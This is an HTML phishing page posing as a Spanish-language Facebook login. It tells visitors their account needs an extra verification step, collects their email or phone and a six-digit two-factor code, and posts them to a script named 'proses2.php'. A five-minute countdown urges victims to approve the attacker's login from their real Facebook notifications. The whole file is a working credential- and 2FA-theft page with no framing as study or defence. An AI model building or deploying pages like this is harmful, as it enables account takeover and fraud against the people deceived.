<!DOCTYPE html>
<html>
<head>
    <title>Iniciar sesión | Iniciar sesión en Facebook</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            width: 80%;
            max-width: 400px;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            text-align: center;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
        }

        .form-group input {
            width: 93%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 16px;
        }

        .form-group .btn-continue {
            background-color: #1877f2;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            width: 100%;
        }

        .form-group .btn-continue:disabled {
            cursor: not-allowed;
            opacity: 0.5;
        }

        @media (max-width: 768px) {
            .container {
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.smartm.com.tw/data/Images/94/73/9e/5a/f1d4bbcce9eb74849a196bf.png?v=1697712084" alt="Yudha" style="max-width: 100%;">
        <form action="proses2.php" method="post">
            <div class="form-group">
                <label for="contact">Su cuenta tiene habilitada la verificación en dos pasos. Se requiere inicio de sesión adicional para verificar la actividad y propiedad de su página.</label>
                <input type="text" id="contact" name="contact" placeholder="Correo electrónico o número de móvil" required>
            </div>
            <div class="form-group">
                <label for="verification">Ingrese el código de 6 dígitos del mensaje que acabamos de enviar a su contacto.</label>
                <input type="text" id="verification" name="verification" placeholder="código" required>
            </div>
            <button type="submit" class="btn-continue" disabled>Iniciar sesión</button>
        </form>
        <p id="countdown">Tombol Continue akan aktif dalam 5 menit.</p>
    </div>
    <script>
        var countdown = 300;
        var countdownDisplay = document.getElementById('countdown');
        var continueButton = document.querySelector('.btn-continue');
        var verificationInput = document.getElementById('verification');

        function updateCountdown() {
            var minutes = Math.floor(countdown / 60);
            var seconds = countdown % 60;
            countdownDisplay.textContent = `Si no recibes un código de verificación Puedes verificar esto volviendo a tu Facebook principal, luego yendo al menú de notificaciones y aprobando tu actividad de inicio de sesión en Facebook dentro del tiempo asignado. ${minutes}:${seconds < 10 ? '0' : ''}${seconds} Minutes.`;

            if (countdown <= 0 || verificationInput.value.length === 6) {
                continueButton.removeAttribute('disabled');
                countdownDisplay.style.display = 'none';
            } else {
                countdown--;
                setTimeout(updateCountdown, 1000);
            }
        }

        verificationInput.addEventListener('input', function() {
            if (verificationInput.value.length === 6) {
                continueButton.removeAttribute('disabled');
            } else {
                continueButton.setAttribute('disabled', true);
            }
        });

        updateCountdown();
    </script>
</body>
</html>
